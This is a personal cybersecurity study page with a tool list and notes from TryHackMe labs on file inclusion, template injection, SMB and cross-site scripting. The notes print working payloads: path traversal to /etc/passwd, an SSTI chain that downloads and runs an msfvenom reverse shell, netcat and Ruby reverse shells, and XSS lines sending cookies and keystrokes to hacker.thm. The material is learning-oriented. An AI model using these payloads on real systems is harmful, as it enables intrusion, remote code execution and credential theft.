---

#   Cybersecurity: Notes and Projects

 <script src="https://tryhackme.com/badge/1210884"></script>

----- 

### **Resources: My Reading List & Accounts**
<details>

<summary>
My Reading List & Resources
</summary>

* Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali (OccupyTheWeb)
* Penetration Testing A Hands-On Introduction to Hacking (Weidman, Georgia)
* Becoming A Master Hacker (OccupyTheWeb)
* Competitive Programming in Python 128 Algorithms to Develop your Coding Skills (Christoph Dürr, Jill-Jênn Vie)
* Real-World Bug Hunting A Field Guide to Web Hacking (Peter Yaworski)
* [Codecademy Profile](https://www.codecademy.com/profiles/JeremyLaratro)
* [TryHackme.com Profile (In the top 8% of users!)](https://tryhackme.com/p/jeremylaratro)
* HackTheBox.com 
* Hacktricks.xyz
* [Picoctf.org Profile](https://play.picoctf.org/users/jeremylaratro)
* [LeetCode Profile](https://leetcode.com/jeremylaratro/)

</details>

[Back to home page](https://jeremylaratro.link)
----------


### **Overview, Tools, and Pathways**

>These are some of the go-to tools I use when starting a machine, CTF, challenge, etc. These tools generally fall into the 
> reconnaissance and vulnerability assessment steps. 

<details>

<summary>
General Enumeration | Scanning | Reconnaissance
</summary>


>>#### whatweb

>- This is often the first tool used when given a domain, to determine basic info about the web server (in cases where a domain is the given target) and to obtain the IP address.


>>####  Nmap  

>- Among the most commonly used tools, nmap allows one to scan the target machine and gain a great deal of information about it, including open ports, services, and even vulnerability assessment via
>- scripts. 


>>####  wpscan  

>- If a wordpress site is identified, wpscan is extremely useful in finding potential vulnerabilities by enumerating plugins along with various other powerful features including bruteforce attacks if xmlrpc is enabled.


>>####  Nessus  

>- Nessus is an all-around vulnerability scanner and can help identify potential vulnerabilities and avenues of attack


>>####  OWASP Zap  

>- OWASP Zap is a GUI-based scanning tool that is focused on the OWASP top 10 vulnerabilities. This is another tool that can be useful in determining potential vulnerabilities.


>>####  Dig, dnsenum, and nslookup

>- These tools, along with various others, are useful in automating the process of DNS queries and can be extremely useful in reconnaissance of a website and in understanding the ownership and relationship between domain names and IPs.</details>

>>####  Shodan
> - Extremely powerful banner search engine.

</details>

-----------

<details>
 
<summary>
|Exploitation and Investigation Tools|
</summary>




### **Web and Network Exploitation**

>There are thousands and thousands of different tools, scripts, and applications out there for all the various different attack types and vulnerabilities. The following are ones which I have personally used in labs and challenges and which I am at least fairly comfortable using.


>####  BURP Suite

>> - Powerful proxy -> intercept and modify requests, leading to a large variety of potential uses

>####  Metasploit

>> - Massive collection of known exploits, scripts, payloads, and database

>####  SQLMap 

>> - SQLi scanner and exploitation tool

>####  dirb, dirbuster, gobuster 

>> - Directory enumeration

>####  ffuf, hydra 

>> - Web fuzzing, directory enumeration, account brute forcing

>####  sstimap, lfimap 

>> - LFI and SSTI vulnerability scanner and exploitation tool

>####  xsssniper

>> - XSS scanner and exploitation tool

>####  rapidscan 

>> - Tool which essentially creates a suite of other popular exploitation tools like sqlmap, dirb, etc. 


----------


### **Offline Tools**


>####  hashcat

>> - GUI-accelerated password cracking tool. Extremely quick.

>####  John the Ripper

>> - Another password cracking tool, particularly useful for it's auto-detection and john2'other' conversion scripts. 

>####  cewl, crunch

>> - Custom password and wordlist generators


>####  binwalk, exiftools, strings, cat

>> - Linux file analysis tools

</details>

----------

### **Areas I'd Like to Improve**



<details>

<summary>
Areas I'd Like to Improve
</summary>


>####  Reverse Engineering

> - One of the areas I'd specifically like to improve in is reverse engineering. This requires a solid working knowledge
> of languages commonly used to build malware, which leads to the next area I'd like to improve -- expanding my programming knowledge.

>####  Programming

> - Currently, I am intermediate with Python, and beginner/intermediate with Java and C++ (ie. comfortable with general OO, functions, 
> classes, namespaces, and familiar with pointers, but not as efficient or fluent with them as I am with Python 
> (ie. with Leetcode, for example, problems which challenge me in Python are extremely difficult for me in C++. I'd
> like to improve my proficiency in C++ and Java, and also increase the number of languages that I am at least
> comfortable with in terms of syntax. 

>#### SSTI and RCE

> - I would like to become less reliant upon tools when attempting to exploit SSTI and RCE vulnerabilities, and thus,
> I need to improve my understanding of PHP and common web frameworks in order to be able to develop my own exploits.

</details>


----------

## **Notes**
> *Notes from labs, CTF's, and machine's on HackTheBox, TryHackMe, OWASP Juice Shop, etc.*


<details>

<summary>
Local File Inclusion and Remote File Inclusion Overview
</summary>

-----

>### **LFI: Local File Inclusion**

-----

Notes from TryHackMe's LFI/RFI room. 


Local file inclusion is a vulnerability that can allow attackers to 

traverse the file system due to improperly or non-sanitized requests. 

This may allow an attacker to access sensitive files, ie /etc/passwd


Commonly used attack vector for LFI is '/../../'


````

get.php?file=../../../../etc/passwd

````


This allows traversal through layers of the directories to the root or target folder/directory. How many times depends on the specific system.

This can be determined by encouraging an error, ie:


````

 index.php?lang=jfbdsgd

 ````

 which then may return an error containing something along the lines of:


````

 in /var/www/html/lab2.php on line 26'

 ````

 
 The presence of 4 layers can be derived from this, and thus, 4 levels can be used for the attack:


 ```python

 index.php?lang=../../../../etc/passwd

 ```

 OS info can be derived as well:


```

 /get.php?file=../../../../boot.ini

 /get.php?file=../../../../windows/win.ini

 
 ```

 Sanitization and filter evasion:

 
 In PHP 5.3.3 and below, NULL bytes can be used to signify end of string and stop .php extension from being appended

 index.php?lang=../../../../etc/passwd%00

 
 Using a '.' can also be used to signify staying within the directory


````

 ../../../../etc/passwd/.

 ````

 Forced directory - if developer forces a directory, evasion is possible by understanding where that directory lies within the levels.

 Evasion may be as simple as adding an extra layer, ie:


````

 /../../../etc/passwd  --> /../../../../etc/passwd

 ````


 Burp suite can be used to evade any request filters that may filter or change characters

Try POST, GET 

If _REQUEST is being used, take advantage of cookies: 


````

POST /challenges////////////chall3.php HTTP/1.1

Host: 10.10.120.210

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://10.10.120.210/challenges///////////chall3.php?file=

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: =../../../etc/flag3

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 25


file=../../../etc/flag3%00

```` 


--------------------------


>### **RFI: Remote File Inclusion**


---------

 
RFI is similar to LFI but involves remote inclusion of files and potentially RCE. It depends on the function:

allow_url_fopen


Overview:

Payload is hosted on attackers servers -> payload injected via HTTP requests using include function -> payload is executed


````

GET /page.php?file=

lang=http://0.0.0.0/r.elf

````


````

O:8:"_construct":1:{s:4:"cookie";s:10:"Some data!";} 

````


Tools:


````

- lfimap

- lfitester

- vailyn

````


</details> 


<details>

<summary>
Server-Side Template Injection - SSTI
</summary>


Notes from SSTI Lab on TryHackMe.


Common test-cases:


````

{7*7}

{{7*7}}'

a{{bar}}b

{var} ${var} {{var}} <%var%> [% var %]


````


1.  Start local server.


````

python3 -m http.server 80


````

2. Test functionality of python server remotely using JS and curl.


````

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.16.5")}


10.10.16.5


````

3. Create reverse shell payload and initialize a netcat listener for it. 


````

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.5.0.2 LPORT=5010 -f elf > r.elf


nc -lvnp 443


````

4. Perform the SSTI, getting RCE on the server.


````

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.5.0.2:5003/r.elf")}


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}


*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}


*{os.system("nc -e /bin/sh 10.10.16.5 5010")}

<%=system("ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.5.0.2%22%2C5007%29%29%27")%>

````


Tools:


````


- sstimap


````


</details>


<details>

<summary>
SMB Exploitation
</summary>


SMB- server message block

* Notes from TryHackMe's SMB room


Enumeration / Recon:

SMB uses port 445

A common service name is 'microsoft-ds'

After enumerating the system and finding a potential SMB exploitation pathway:

Further enumerate the SMB service using smbclient:


````


smbclient -L ip 


````


* Share names will be listed


	
Check for the guest or anonymous login, ie:

Sharenames:


````

ADMIN$

C$

WorkShares

````


After identifying potentially vulnerable share, attempt login:


````

smbclient \\\\ip\\<share>>

````


Upon entry --> 

* browse directories, look for sensitive files

* potential path traversal, pivot to other shares



</details>

-------

>### **XSS: Cross Site Scripting**

-------

<details>
<summary>
XSS
</summary>



Injection attack where a malicious payload can be injected into a web page and potentially result in an attacker getting user, staff, or other sensitive data


Check:

	
~~~

<script>alert('XSS');</script>

~~~

	
Session stealing:

	
~~~

<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

~~~

Key loggger:

	
~~~

<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

~~~



	
~~~

<script>user.changeEmail('attacker@hacker.thm');</script>

~~~


#### Stored

Stored XSS is XSS where a payload is injected into a webpage, and stored at the server level, resulting in that malicious code's presentation to other users of the site. This allows for various serious threats. 

Attack Vectors:

Comments on a blog

User profile information

Website Listings



#### Reflected

Reflected XSS, on the other hand, is XSS where the payload is reflected only on the page instance itself. Attackers must send a link to the altered page to a victim to take advantage of reflected XSS, as it is not stored at the server level.

Attack Vectors:

Parameters in the URL Query String

URL File Path 


	
#### DOM

DOM-based XSS depends on JS code executing locally and not server-side. This allows for an attacker to exploit specific JS function and then, like reflected XSS, send a link with the malicious code injected. Requires a deeper level of JS to exploit. 

Attack Vectors:

eval()


	
#### Blind

Blind XSS is XSS where malicious code is presented to other users, as in stored XSS, however you are unable to see it. In order for attackers to take advantage of this XSS, an HTML callback is incorporated into the payload.



Evasion:

	
~~~

"><script>alert(1);</script>

~~~

	
Close tag of encapsulating div:

	
~~~

</textarea><script>alert(1);</script>

~~~

	
Filter evasion:

Filter for 'script' --> sscriptcript

	
~~~

<sscriptcript>alert(1);</sscriptcript>

~~~

	
Within an image:

	
~~~

/images/cat.jpg" onload="alert(1);

~~~

	
Tools:

	
````

	
- xsshunter

- xsssniper

- xssstealer

- garud

- 0d1n

````


</details>



